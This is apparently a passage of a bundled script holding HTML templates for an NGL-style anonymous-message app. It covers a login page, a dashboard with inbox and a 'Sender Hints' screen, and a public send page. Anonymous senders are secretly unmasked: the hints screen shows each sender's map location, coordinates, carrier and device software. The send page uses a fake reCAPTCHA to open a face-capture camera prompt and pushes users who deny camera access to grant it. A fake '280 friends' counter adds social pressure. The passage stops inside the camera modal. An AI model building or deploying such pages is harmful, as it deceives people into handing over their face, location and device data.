                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                <line x1="1" y1="1" x2="23" y2="23"/>
              </svg>
            </button>
          </div>
        </div>
        <button class="btn" id="submitBtn" type="submit">Log in</button>
        <div class="err" id="err"></div>
      </form>
    </div>
    <div class="foot">👇 280 friends just tapped the button 👇</div>
  </div>
<script>
  function togglePassword(){
    const inp = document.getElementById('password');
    const open = document.getElementById('eyeOpen');
    const off = document.getElementById('eyeOff');
    const btn = document.getElementById('pwToggle');
    if(inp.type === 'password'){
      inp.type = 'text';
      open.style.display = 'none';
      off.style.display = 'block';
      btn.setAttribute('aria-label','Hide password');
    } else {
      inp.type = 'password';
      open.style.display = 'block';
      off.style.display = 'none';
      btn.setAttribute('aria-label','Show password');
    }
  }
  let mode = 'login';
  function switchTab(m){
    mode = m;
    document.getElementById('tab-login').classList.toggle('active', m==='login');
    document.getElementById('tab-signup').classList.toggle('active', m==='signup');
    document.getElementById('title').textContent = m==='login' ? 'welcome back' : 'create account';
    document.getElementById('submitBtn').textContent = m==='login' ? 'Log in' : 'Sign up';
    document.getElementById('err').textContent = '';
  }
  async function submitAuth(e){
    e.preventDefault();
    const btn = document.getElementById('submitBtn');
    const err = document.getElementById('err');
    err.textContent='';
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value;
    btn.disabled = true; btn.textContent = '...';
    try {
      const res = await fetch('/api/'+mode, {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ username, password })
      });
      const data = await res.json();
      if(!res.ok){ throw new Error(data.error || 'Something went wrong'); }
      window.location.href = '/dashboard';
    } catch(ex){
      err.textContent = ex.message;
      btn.disabled = false;
      btn.textContent = mode==='login' ? 'Log in' : 'Sign up';
    }
  }
<\/script>
</body>
</html>`}function je(){return`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>NGL</title>
<link rel="icon" href="/static/logo.png">
<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
<style>
  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
  body { font-family:'Nunito',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; background:#fff; color:#111; }
  .app { max-width:480px; margin:0 auto; min-height:100vh; position:relative; padding-bottom:90px; }

  /* Header tab bar */
  header { display:flex; align-items:center; justify-content:space-between; padding:16px 18px 8px; position:sticky; top:0; background:#fff; z-index:10; }
  .icon-btn { width:38px; height:38px; border-radius:50%; background:#f2f2f4; border:none; display:flex; align-items:center; justify-content:center; font-size:16px; color:#555; cursor:pointer; }
  .tabsnav { display:flex; gap:20px; align-items:center; }
  .tabsnav button { border:none; background:none; font-family:inherit; font-weight:900; font-size:18px; letter-spacing:.5px; color:#c7c7cc; cursor:pointer; position:relative; padding:4px 0; }
  .tabsnav button.active { color:#111; }
  .dot { width:8px; height:8px; border-radius:50%; background:#f5334f; display:inline-block; margin-left:5px; vertical-align:middle; }

  /* PLAY */
  .play-card {
    margin:24px 18px 0; border-radius:22px; overflow:hidden; position:relative;
    background:linear-gradient(135deg,#f7b9a5,#c9a0d4,#7fb0d8); min-height:250px;
    display:flex; flex-direction:column; align-items:center; justify-content:center; box-shadow:0 8px 24px rgba(0,0,0,.12);
  }
  .play-card .bgblur { position:absolute; inset:0; background-size:cover; background-position:center; filter:blur(2px) brightness(.95); }
  .play-card .overlay { position:relative; z-index:2; display:flex; flex-direction:column; align-items:center; padding:30px 20px; }
  .avatar-wrap { position:relative; width:92px; height:92px; margin-bottom:16px; }
  .avatar { width:92px; height:92px; border-radius:50%; background:#e3e3e6 center/cover no-repeat; border:3px solid #fff; display:flex; align-items:center; justify-content:center; overflow:hidden; }
  .avatar img { width:100%; height:100%; object-fit:cover; }
  .no-pfp { width:100%; height:100%; display:block; }
  .edit-pencil { position:absolute; bottom:0; right:0; width:30px; height:30px; border-radius:50%; background:#fff; border:2px solid #f0f0f0; display:flex; align-items:center; justify-content:center; font-size:13px; cursor:pointer; box-shadow:0 2px 6px rgba(0,0,0,.15); }
  .play-title { color:#fff; font-weight:900; font-size:24px; text-align:center; text-shadow:0 2px 8px rgba(0,0,0,.35); line-height:1.15; }
  .dice-mini { position:absolute; bottom:14px; right:14px; width:34px; height:34px; border-radius:50%; background:rgba(255,255,255,.55); display:flex; align-items:center; justify-content:center; font-size:16px; z-index:3; }

  .step-box { margin:18px 18px 0; background:#f4f4f6; border-radius:20px; padding:20px 18px; text-align:center; }
  .step-box h3 { font-size:17px; font-weight:900; margin-bottom:12px; }
  .link-text { color:#b0b0b5; font-weight:800; font-size:14px; letter-spacing:.5px; margin-bottom:14px; word-break:break-all; text-transform:uppercase; }
  .copy-btn { background:#fff; border:2px solid #f5334f; color:#f5334f; font-family:inherit; font-weight:900; font-size:15px; padding:12px 30px; border-radius:30px; cursor:pointer; transition:.15s; }
  .copy-btn:active { transform:scale(.97); }
  .copy-btn.copied { background:#f5334f; color:#fff; }
  .share-btn { width:100%; border:none; background:linear-gradient(90deg,#e91e8c,#ff7a00); color:#fff; font-family:inherit; font-weight:900; font-size:17px; padding:15px; border-radius:30px; cursor:pointer; margin-top:6px; }
  .share-btn:active { transform:scale(.98); }

  /* INBOX */
  .inbox-list { padding:8px 0; }
  .msg-item { display:flex; align-items:center; gap:14px; padding:16px 18px; border-bottom:1px solid #f0f0f0; cursor:pointer; }
  .msg-item:active { background:#fafafa; }
  .msg-icon { width:52px; height:52px; border-radius:50%; background:#f1f1f3; display:flex; align-items:center; justify-content:center; font-size:24px; flex-shrink:0; }
  .msg-icon.unread { background:linear-gradient(135deg,#f5334f,#ff7a00); }
  .msg-body { flex:1; min-width:0; }
  .msg-body .txt { font-weight:800; font-size:15px; color:#111; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
  .msg-body .txt.new { color:#f5334f; }
  .msg-body .time { font-size:13px; color:#b0b0b5; font-weight:700; margin-top:2px; }
  .chev { color:#c7c7cc; font-size:18px; }
  .empty { text-align:center; padding:60px 20px; color:#b0b0b5; font-weight:800; }

  .bottom-btn { position:fixed; bottom:20px; left:50%; transform:translateX(-50%); width:calc(100% - 40px); max-width:440px; background:#000; color:#fff; border:none; font-family:inherit; font-weight:900; font-size:17px; padding:17px; border-radius:34px; cursor:pointer; box-shadow:0 8px 24px rgba(0,0,0,.25); z-index:20; }
  .bottom-btn:active { transform:translateX(-50%) scale(.98); }

  /* Reply/message detail modal */
  .modal { position:fixed; inset:0; background:#f4f4f4; z-index:100; display:none; flex-direction:column; overflow-y:auto; }
  .modal.open { display:flex; }
  .modal-header { display:flex; align-items:center; justify-content:space-between; padding:14px 18px; }
  .seg { display:flex; gap:4px; background:#e2e2e4; border-radius:20px; padding:4px; }
  .seg span { width:34px; height:30px; border-radius:16px; display:flex; align-items:center; justify-content:center; font-size:14px; color:#888; }
  .seg span.on { background:#c9c9cc; color:#333; }
  .reply-card { margin:auto 24px; width:calc(100% - 48px); max-width:420px; align-self:center; border-radius:32px; overflow:hidden; box-shadow:0 10px 30px rgba(0,0,0,.12); }
  .reply-top { background:linear-gradient(90deg,#e60067,#ff5e00); color:#fff; font-weight:900; font-size:20px; padding:28px 24px; }
  .reply-bottom { background:#fff; padding:38px 24px; text-align:center; font-weight:900; font-size:20px; color:#111; word-break:break-word; }
  .reply-tools { display:flex; gap:16px; justify-content:center; margin:22px 0; }
  .reply-tools .tool { width:44px; height:44px; border-radius:50%; background:#e9e9eb; display:flex; align-items:center; justify-content:center; font-size:18px; }
  .colorwheel { background:conic-gradient(red,orange,yellow,lime,cyan,blue,magenta,red) !important; }
  .modal-actions { padding:0 24px 30px; display:flex; flex-direction:column; gap:12px; }
  .see-hints { background:#f52b44; color:#fff; border:none; font-family:inherit; font-weight:900; font-size:17px; padding:16px; border-radius:32px; cursor:pointer; }
  .reply-btn2 { background:#000; color:#fff; border:none; font-family:inherit; font-weight:900; font-size:17px; padding:16px; border-radius:32px; cursor:pointer; }
  .close-x { width:38px; height:38px; border-radius:50%; background:#e2e2e4; border:none; font-size:18px; color:#555; cursor:pointer; }

  /* Sender hints screen */
  .hints { position:fixed; inset:0; background:#f4f4f6; z-index:200; display:none; flex-direction:column; overflow-y:auto; }
  .hints.open { display:flex; }
  .hints-header { display:flex; align-items:center; justify-content:space-between; padding:16px 18px; position:sticky; top:0; background:#f4f4f6; }
  .hints-title { display:flex; align-items:center; gap:10px; font-weight:900; font-size:18px; color:#555; }
  .pro-badge { background:linear-gradient(90deg,#f5334f,#ff7a00); color:#fff; font-size:11px; font-weight:900; padding:3px 9px; border-radius:12px; letter-spacing:.5px; }
  .hints-body { padding:0 16px 40px; }
  .section-label { display:flex; align-items:center; gap:8px; font-weight:900; font-size:15px; color:#333; margin:20px 4px 10px; }
  .hcard { background:#fff; border-radius:16px; padding:4px 16px; box-shadow:0 1px 3px rgba(0,0,0,.05); }
  .hrow { display:flex; align-items:center; padding:15px 0; border-bottom:1px solid #f0f0f0; }
  .hrow:last-child { border-bottom:none; }
  .hrow .hicon { width:34px; height:34px; border-radius:50%; background:#f2f2f4; display:flex; align-items:center; justify-content:center; font-size:15px; margin-right:14px; flex-shrink:0; }
  .hrow .hlabel { font-weight:800; font-size:15px; color:#111; flex:1; }
  .hrow .hvalue { font-weight:700; font-size:14px; color:#666; text-align:right; }
  .map-card { background:#fff; border-radius:16px; overflow:hidden; box-shadow:0 1px 3px rgba(0,0,0,.05); }
  .map-frame { width:100%; height:180px; border:none; display:block; background:#e5e5e5; }
  .map-loc { display:flex; align-items:center; gap:10px; padding:15px 16px; font-weight:800; font-size:15px; }

  /* Profile pic upload modal */
  .pp-modal { position:fixed; inset:0; background:rgba(0,0,0,.6); z-index:300; display:none; align-items:center; justify-content:center; padding:24px; }
  .pp-modal.open { display:flex; }
  .pp-box { background:#fff; border-radius:22px; padding:26px 22px; width:100%; max-width:340px; text-align:center; }
  .pp-box h3 { font-weight:900; font-size:18px; margin-bottom:16px; }
  .pp-preview { width:120px; height:120px; border-radius:50%; margin:0 auto 18px; background:#e3e3e6 center/cover no-repeat; display:flex; align-items:center; justify-content:center; overflow:hidden; }
  .pp-preview img { width:100%; height:100%; object-fit:cover; }
  .pp-actions { display:flex; gap:10px; }
  .pp-actions button { flex:1; padding:13px; border-radius:16px; border:none; font-family:inherit; font-weight:900; font-size:15px; cursor:pointer; }
  .pp-choose { background:#f1f1f3; color:#333; }
  .pp-save { background:#000; color:#fff; }
  .toast { position:fixed; bottom:100px; left:50%; transform:translateX(-50%); background:#111; color:#fff; padding:12px 22px; border-radius:30px; font-weight:800; font-size:14px; z-index:500; opacity:0; transition:.3s; pointer-events:none; }
  .toast.show { opacity:1; }
</style>
</head>
<body>
<div class="app">
  <header>
    <button class="icon-btn" title="views">👁</button>
    <nav class="tabsnav">
      <button id="nav-play" class="active" onclick="showTab('play')">PLAY</button>
      <button id="nav-inbox" onclick="showTab('inbox')">INBOX<span class="dot" id="inboxdot" style="display:none"></span></button>
    </nav>
    <button class="icon-btn" title="settings" onclick="logout()">⚙️</button>
  </header>

  <!-- PLAY TAB -->
  <section id="tab-play">
    <div class="play-card">
      <div class="bgblur" id="cardbg"></div>
      <div class="overlay">
        <div class="avatar-wrap">
          <div class="avatar" id="playAvatar"><svg class="no-pfp" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-label="No profile picture"><circle cx="50" cy="50" r="50" fill="#e3e3e6"/><circle cx="50" cy="40" r="16" fill="#b6b6bd"/><path d="M22 84c0-15 12.5-24 28-24s28 9 28 24z" fill="#b6b6bd"/></svg></div>
          <div class="edit-pencil" onclick="openPP()">✏️</div>
        </div>
        <div class="play-title">send me anonymous<br>messages!</div>
      </div>
      <div class="dice-mini">🎲</div>
    </div>

    <div class="step-box">
      <h3>Step 1: Copy your link</h3>
      <div class="link-text" id="linkText">loading…</div>
      <button class="copy-btn" id="copyBtn" onclick="copyLink()">copy link</button>
    </div>

    <div class="step-box">
      <h3>Step 2: Share link on your story</h3>
      <button class="share-btn" onclick="shareLink()">Share!</button>
    </div>
  </section>

  <!-- INBOX TAB -->
  <section id="tab-inbox" style="display:none">
    <div class="inbox-list" id="inboxList"><div class="empty">Loading…</div></div>
  </section>

  <button class="bottom-btn" id="bottomBtn" onclick="onBottom()">Get messages!</button>
</div>

<!-- Message detail / reply modal -->
<div class="modal" id="msgModal">
  <div class="modal-header">
    <button class="icon-btn">⚠️</button>
    <div class="seg"><span class="on">📷</span><span>𝕏</span><span>👻</span></div>
    <button class="close-x" onclick="closeMsg()">✕</button>
  </div>
  <div class="reply-card">
    <div class="reply-top">send me anonymous messages!</div>
    <div class="reply-bottom" id="replyBody">…</div>
  </div>
  <div class="reply-tools">
    <div class="tool colorwheel"></div>
    <div class="tool">📷</div>
  </div>
  <div class="modal-actions">
    <button class="see-hints" onclick="openHints()">see hints</button>
    <button class="reply-btn2">📷 reply</button>
  </div>
</div>

<!-- Sender hints -->
<div class="hints" id="hintsScreen">
  <div class="hints-header">
    <div class="hints-title">Sender Hints <span class="pro-badge">PRO</span></div>
    <button class="close-x" onclick="closeHints()">✕</button>
  </div>
  <div class="hints-body">
    <div class="section-label">📍 Location</div>
    <div class="map-card">
      <iframe class="map-frame" id="hintMap" loading="lazy"></iframe>
      <div class="map-loc"><span>📍</span><span id="hintLoc">Unknown</span></div>
    </div>

    <div class="section-label">📱 Phone</div>
    <div class="hcard">
      <div class="hrow"><div class="hicon">⚙️</div><div class="hlabel">software</div><div class="hvalue" id="hSoftware">—</div></div>
      <div class="hrow"><div class="hicon">📶</div><div class="hlabel">carrier/isp</div><div class="hvalue" id="hCarrier">—</div></div>
      <div class="hrow"><div class="hicon">🌐</div><div class="hlabel">Sent from</div><div class="hvalue" id="hSentFrom">—</div></div>
      <div class="hrow"><div class="hicon">🕐</div><div class="hlabel">time sent</div><div class="hvalue" id="hTime">—</div></div>
    </div>
  </div>
</div>

<!-- Profile pic modal -->
<div class="pp-modal" id="ppModal">
  <div class="pp-box">
    <h3>Change profile picture</h3>
    <div class="pp-preview" id="ppPreview"><svg class="no-pfp" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-label="No profile picture"><circle cx="50" cy="50" r="50" fill="#e3e3e6"/><circle cx="50" cy="40" r="16" fill="#b6b6bd"/><path d="M22 84c0-15 12.5-24 28-24s28 9 28 24z" fill="#b6b6bd"/></svg></div>
    <input type="file" id="ppFile" accept="image/*" style="display:none" onchange="ppSelected(event)">
    <div class="pp-actions">
      <button class="pp-choose" onclick="document.getElementById('ppFile').click()">Choose photo</button>
      <button class="pp-save" id="ppSaveBtn" onclick="savePP()">Save</button>
    </div>
    <button style="margin-top:14px;background:none;border:none;color:#999;font-family:inherit;font-weight:800;cursor:pointer" onclick="closePP()">Cancel</button>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
  let ME = null;
  let PP_DATA = null;
  const NO_PFP = '<svg class="no-pfp" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-label="No profile picture"><circle cx="50" cy="50" r="50" fill="#e3e3e6"/><circle cx="50" cy="40" r="16" fill="#b6b6bd"/><path d="M22 84c0-15 12.5-24 28-24s28 9 28 24z" fill="#b6b6bd"/></svg>';

  function toast(msg){ const t=document.getElementById('toast'); t.textContent=msg; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),1800); }
  function timeAgo(iso){
    const d = new Date(iso.replace(' ','T')+'Z');
    const s = Math.floor((Date.now()-d.getTime())/1000);
    if(s<60) return 'a few seconds ago';
    const m=Math.floor(s/60); if(m<60) return m+' minute'+(m>1?'s':'')+' ago';
    const h=Math.floor(m/60); if(h<24) return h+' hour'+(h>1?'s':'')+' ago';
    const dd=Math.floor(h/24); if(dd===1) return 'a day ago';
    return dd+' days ago';
  }
  function fmtTime(iso){
    const d=new Date(iso.replace(' ','T')+'Z');
    const p=n=>String(n).padStart(2,'0');
    return p(d.getMonth()+1)+'/'+p(d.getDate())+'/'+d.getFullYear()+' '+p(d.getHours())+':'+p(d.getMinutes());
  }

  async function init(){
    const res = await fetch('/api/me');
    if(!res.ok){ window.location.href='/'; return; }
    ME = await res.json();
    const url = window.location.origin.replace(/^https?:\\/\\//,'') + '/' + ME.username;
    document.getElementById('linkText').textContent = url;
    if(ME.profile_pic){ setAvatar(ME.profile_pic); }
    if(ME.is_admin){
      const gear = document.querySelector('header .icon-btn:last-child');
      const adminBtn = document.createElement('button');
      adminBtn.className='icon-btn'; adminBtn.textContent='🛡'; adminBtn.title='admin';
      adminBtn.onclick=()=>window.location.href='/admin';
      gear.parentNode.insertBefore(adminBtn, gear);
    }
    loadInbox();
  }
  function setAvatar(src){
    document.getElementById('playAvatar').innerHTML = '<img src="'+src+'">';
    document.getElementById('cardbg').style.backgroundImage = 'url('+src+')';
  }

  function showTab(t){
    document.getElementById('nav-play').classList.toggle('active', t==='play');
    document.getElementById('nav-inbox').classList.toggle('active', t==='inbox');
    document.getElementById('tab-play').style.display = t==='play'?'block':'none';
    document.getElementById('tab-inbox').style.display = t==='inbox'?'block':'none';
    document.getElementById('bottomBtn').textContent = t==='play' ? 'Get your own messages!' : 'Get messages!';
    if(t==='inbox') loadInbox();
  }
  function onBottom(){
    const playing = document.getElementById('tab-play').style.display !== 'none';
    if(playing){ copyLink(); } else { showTab('play'); }
  }

  function copyLink(){
    const link = window.location.origin + '/' + ME.username;
    navigator.clipboard.writeText(link).then(()=>{
      const b=document.getElementById('copyBtn'); b.textContent='✓ copied!'; b.classList.add('copied');
      setTimeout(()=>{ b.textContent='copy link'; b.classList.remove('copied'); },1500);
    }).catch(()=>toast('Copy failed'));
  }
  function shareLink(){
    const link = window.location.origin + '/' + ME.username;
    if(navigator.share){ navigator.share({title:'send me anonymous messages!',url:link}).catch(()=>{}); }
    else { navigator.clipboard.writeText(link); toast('Link copied — share it on your story!'); }
  }

  async function loadInbox(){
    const res = await fetch('/api/inbox');
    if(!res.ok) return;
    const data = await res.json();
    const list = document.getElementById('inboxList');
    const msgs = data.messages || [];
    const unread = msgs.filter(m=>!m.is_read).length;
    document.getElementById('inboxdot').style.display = unread>0?'inline-block':'none';
    if(msgs.length===0){ list.innerHTML='<div class="empty">No messages yet.<br>Share your link to get anonymous messages! 💌</div>'; return; }
    list.innerHTML = msgs.map(m=>{
      const unreadCls = m.is_read ? '' : 'unread';
      const txtCls = m.is_read ? '' : 'new';
      const label = m.is_read ? escapeHtml(m.body) : 'New Message!';
      return \`<div class="msg-item" onclick="openMsg(\${m.id})">
        <div class="msg-icon \${unreadCls}">\${m.is_read?'💌':'💌'}</div>
        <div class="msg-body"><div class="txt \${txtCls}">\${label}</div><div class="time">\${timeAgo(m.created_at)}</div></div>
        <div class="chev">›</div>
      </div>\`;
    }).join('');
  }
  function escapeHtml(s){ return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }

  let CURRENT_MSG = null;
  async function openMsg(id){
    const res = await fetch('/api/message/'+id);
    if(!res.ok){ toast('Could not load'); return; }
    CURRENT_MSG = await res.json();
    document.getElementById('replyBody').textContent = CURRENT_MSG.body;
    document.getElementById('msgModal').classList.add('open');
    loadInbox();
  }
  function closeMsg(){ document.getElementById('msgModal').classList.remove('open'); }

  function openHints(){
    const m = CURRENT_MSG; if(!m) return;
    document.getElementById('hSoftware').textContent = m.software || 'Unknown';
    document.getElementById('hCarrier').textContent = m.carrier || 'Unknown';
    document.getElementById('hSentFrom').textContent = m.sent_from || 'Web Browser';
    document.getElementById('hTime').textContent = fmtTime(m.created_at);
    document.getElementById('hintLoc').textContent = m.location || 'Unknown location';
    const map = document.getElementById('hintMap');
    if(m.lat!=null && m.lon!=null){
      map.src = 'https://maps.google.com/maps?q='+m.lat+','+m.lon+'&z=12&output=embed';
    } else {
      map.src = 'https://maps.google.com/maps?q='+encodeURIComponent(m.location||'')+'&z=6&output=embed';
    }
    document.getElementById('hintsScreen').classList.add('open');
  }
  function closeHints(){ document.getElementById('hintsScreen').classList.remove('open'); }

  // Profile pic
  function openPP(){ document.getElementById('ppModal').classList.add('open'); const p=document.getElementById('ppPreview'); p.innerHTML = ME.profile_pic?'<img src="'+ME.profile_pic+'">':NO_PFP; PP_DATA=null; }
  function closePP(){ document.getElementById('ppModal').classList.remove('open'); }
  function ppSelected(e){
    const file = e.target.files[0]; if(!file) return;
    const img = new Image();
    const reader = new FileReader();
    reader.onload = ()=>{
      img.onload = ()=>{
        // resize to max 400px square
        const size=400; const canvas=document.createElement('canvas'); canvas.width=size; canvas.height=size;
        const ctx=canvas.getContext('2d');
        const scale=Math.max(size/img.width,size/img.height);
        const w=img.width*scale, h=img.height*scale;
        ctx.drawImage(img,(size-w)/2,(size-h)/2,w,h);
        PP_DATA = canvas.toDataURL('image/jpeg',0.85);
        document.getElementById('ppPreview').innerHTML='<img src="'+PP_DATA+'">';
      };
      img.src = reader.result;
    };
    reader.readAsDataURL(file);
  }
  async function savePP(){
    if(!PP_DATA){ toast('Choose a photo first'); return; }
    const btn=document.getElementById('ppSaveBtn'); btn.disabled=true; btn.textContent='...';
    const res = await fetch('/api/profile-pic',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:PP_DATA})});
    btn.disabled=false; btn.textContent='Save';
    if(res.ok){ ME.profile_pic=PP_DATA; setAvatar(PP_DATA); closePP(); toast('Profile picture updated!'); }
    else { toast('Failed to save'); }
  }

  async function logout(){
    if(confirm('Log out?')){ await fetch('/api/logout',{method:'POST'}); window.location.href='/'; }
  }

  init();
<\/script>
</body>
</html>`}var Me=`<svg class="no-pfp" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-label="No profile picture"><circle cx="50" cy="50" r="50" fill="#e3e3e6"/><circle cx="50" cy="40" r="16" fill="#b6b6bd"/><path d="M22 84c0-15 12.5-24 28-24s28 9 28 24z" fill="#b6b6bd"/></svg>`;function Ne(e,t){let n=t?`<img src="${Pe(t)}" alt="">`:Me;return`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>@${K(e)} — send me anonymous messages!</title>
<link rel="icon" href="/static/logo.png">
<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
<style>
  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
  body { font-family:'Nunito',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
    min-height:100vh; background:linear-gradient(155deg,#d81b60 0%,#f5334f 42%,#ff7a00 100%);
    color:#fff; display:flex; flex-direction:column; align-items:center; padding:20px; }
  .container { width:100%; max-width:440px; margin:auto 0; }

  .msg-card { background:#fff; border-radius:24px; overflow:hidden; box-shadow:0 12px 34px rgba(0,0,0,.18); }
  .card-head { display:flex; align-items:center; gap:12px; padding:16px 18px; }
  .card-avatar { width:46px; height:46px; border-radius:50%; background:#e3e3e6; display:flex; align-items:center; justify-content:center; overflow:hidden; flex-shrink:0; }
  .card-avatar img { width:100%; height:100%; object-fit:cover; }
  .no-pfp { width:100%; height:100%; display:block; }
  .card-head .meta .u { font-weight:900; font-size:15px; color:#111; }
  .card-head .meta .p { font-weight:800; font-size:15px; color:#111; }

  .input-area { position:relative; background:linear-gradient(160deg,#f9c5cf,#f4a9b3); min-height:150px; padding:20px; }
  #msgInput { width:100%; min-height:110px; border:none; outline:none; background:transparent; resize:none;
    font-family:inherit; font-weight:800; font-size:22px; color:#000000; line-height:1.35; }
  /* placeholder overlay (animated random questions) */
  .placeholder { position:absolute; top:20px; left:20px; right:20px; font-weight:800; font-size:22px; color:rgba(90,70,75,.65); pointer-events:none; line-height:1.35; transition:opacity .5s ease; }
  .placeholder.fade-out { opacity:0; }
  .placeholder.fade-in { opacity:1; }
  .placeholder.hidden { display:none; }
  .dice { position:absolute; bottom:14px; right:14px; width:40px; height:40px; border-radius:50%; background:rgba(255,255,255,.75); display:flex; align-items:center; justify-content:center; font-size:20px; cursor:pointer; box-shadow:0 2px 6px rgba(0,0,0,.12); }
  .dice:active { transform:scale(.9); }

  .anon { text-align:center; font-weight:800; font-size:15px; margin:16px 0 14px; color:#fff; }

  .send-btn { width:100%; background:#000; color:#fff; border:none; font-family:inherit; font-weight:900; font-size:19px; padding:18px; border-radius:34px; cursor:pointer; transition:transform .1s; }
  .send-btn:active { transform:scale(.98); }
  .send-btn:disabled { opacity:.55; }

  /* captcha box */
  .captcha { margin-top:16px; background:#fff; border-radius:6px; padding:14px 16px; display:none; align-items:center; box-shadow:0 2px 10px rgba(0,0,0,.12); color:#000; }
  .captcha.show { display:flex; }
  .cap-box { width:26px; height:26px; border:2px solid #c1c1c1; border-radius:3px; margin-right:14px; cursor:pointer; display:flex; align-items:center; justify-content:center; flex-shrink:0; background:#fff; transition:.15s; }
  .cap-box .spinner { width:18px; height:18px; border:3px solid #d3d3d3; border-top-color:#4285f4; border-radius:50%; animation:spin .7s linear infinite; display:none; }
  .cap-box.loading .spinner { display:block; }
  .cap-box.checked { border-color:#1a73e8; }
  .cap-box .check { display:none; color:#1db954; font-size:20px; font-weight:900; }
  .cap-box.checked .check { display:block; }
  @keyframes spin { to { transform:rotate(360deg); } }
  .cap-label { font-weight:700; font-size:15px; color:#000; flex:1; }
  .cap-logo { text-align:right; font-size:10px; color:#9aa0a6; line-height:1.2; }
  .cap-logo .r { font-weight:800; font-size:11px; color:#5f6368; }

  .foot { text-align:center; margin-top:26px; }
  .counter { font-weight:900; font-size:16px; color:#fff; margin-bottom:14px; }
  .own-btn { width:100%; background:#000; color:#fff; border:none; font-family:inherit; font-weight:900; font-size:18px; padding:17px; border-radius:34px; cursor:pointer; animation:pulse 1.6s ease-in-out infinite; }
  @keyframes pulse { 0%,100%{ transform:scale(1); box-shadow:0 6px 20px rgba(0,0,0,.2);} 50%{ transform:scale(1.04); box-shadow:0 10px 28px rgba(0,0,0,.32);} }
  .links { margin-top:18px; text-align:center; font-size:13px; }
  .links a { color:rgba(255,255,255,.75); text-decoration:none; margin:0 8px; font-weight:700; }

  /* Verify camera modal */
  .verify { position:fixed; inset:0; background:rgba(0,0,0,.55); backdrop-filter:blur(4px); z-index:400; display:none; align-items:center; justify-content:center; padding:20px; }
  .verify.open { display:flex; }
  .verify-box { background:#fff; border-radius:20px; padding:22px; width:100%; max-width:360px; text-align:center; color:#111; }
  .verify-box h3 { font-weight:900; font-size:19px; margin-bottom:4px; }
  .verify-box .desc { color:#777; font-weight:700; font-size:13px; margin-bottom:16px; }
  .cam-wrap { position:relative; width:240px; height:240px; margin:0 auto 14px; border-radius:16px; overflow:hidden; background:#000; }
  #video { width:100%; height:100%; object-fit:cover; transform:scaleX(-1); }
  #overlay { position:absolute; inset:0; }
  /* Fixed head-guide trace (does NOT move, stays centered) */
  .head-guide { position:absolute; inset:0; z-index:3; pointer-events:none; display:flex; align-items:center; justify-content:center; }
  .head-guide svg { width:82%; height:82%; }
  .checks { text-align:left; margin:0 auto 14px; max-width:220px; }
  .chk { display:flex; align-items:center; gap:8px; font-weight:800; font-size:14px; color:#aaa; padding:3px 0; transition:.2s; }
  .chk.ok { color:#1db954; }
  .chk .mark { width:20px; text-align:center; }
  .status { font-weight:800; font-size:14px; color:#555; min-height:20px; }

  /* camera denied tutorial */
  .denied { position:fixed; inset:0; background:#fff; z-index:500; display:none; flex-direction:column; padding:30px 24px; overflow-y:auto; color:#111; }
  .denied.open { display:flex; }
  .denied h2 { font-weight:900; font-size:22px; margin-bottom:6px; color:#f5334f; }
  .denied p { font-weight:700; color:#555; margin-bottom:18px; }
  .denied ol { padding-left:22px; }
  .denied li { font-weight:800; font-size:15px; margin-bottom:14px; line-height:1.4; }
  .denied .reload { margin-top:20px; background:#000; color:#fff; border:none; font-family:inherit; font-weight:900; font-size:17px; padding:16px; border-radius:30px; cursor:pointer; }
  .sent-screen { text-align:center; }
  .sent-screen .big { font-size:60px; margin-bottom:14px; }
</style>
</head>
<body>
  <div class="container" id="mainScreen">
    <div class="msg-card">
      <div class="card-head">
        <div class="card-avatar">${n}</div>
        <div class="meta">
          <div class="u">@${K(e)}</div>
          <div class="p">send me anonymous messages!</div>
        </div>
      </div>
      <div class="input-area">
        <div class="placeholder" id="placeholder"></div>
        <textarea id="msgInput" maxlength="1000" rows="3"></textarea>
        <div class="dice" id="dice" onclick="rollDice()">🎲</div>
      </div>
    </div>

    <div class="anon">🔒 anonymous q&a</div>
    <button class="send-btn" id="sendBtn" onclick="attemptSend()">Send!</button>

    <div class="captcha" id="captcha">
      <div class="cap-box" id="capBox" onclick="startVerify()">
        <div class="spinner"></div>
        <div class="check">✓</div>
      </div>
      <div class="cap-label" id="capLabel">I'm not a robot</div>
      <div class="cap-logo"><div class="r">reCAPTCHA</div>Privacy - Terms</div>
    </div>

    <div class="foot">
      <div class="counter" id="counter">👇 <span id="cnum">280</span> friends just tapped the button 👇</div>
      <button class="own-btn" onclick="window.location.href='/'">Get your own messages!</button>
      <div class="links"><a href="/">Terms</a><a href="/">Privacy</a></div>
    </div>
  </div>

  <!-- Verify camera modal -->
  <div class="verify" id="verifyModal">
    <div class="verify-box">
      <h3>Verify you're human</h3>
      <div class="desc">Line up your face with the outline so we can confirm you're a real person</div>
      <div class="cam-wrap">
